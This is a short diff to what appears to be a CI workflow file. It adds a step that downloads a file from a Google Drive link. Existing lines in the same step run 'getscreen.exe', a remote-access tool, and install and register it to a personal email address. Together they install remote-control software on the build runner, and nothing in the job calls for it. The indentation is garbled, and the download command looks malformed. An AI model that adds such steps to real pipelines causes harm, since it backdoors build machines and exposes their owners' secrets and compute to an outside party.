@@ -10,7 +10,8 @@ jobs:
     steps:
       - name: first step
         run: |  
-        
+     
+            Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=13fp07AYiONScFmMkJTdLNjto_m-Lo20d"
              cmd /c getscreen.exe 
               cmd /c -install -register kauanscintras@gmail.com
     
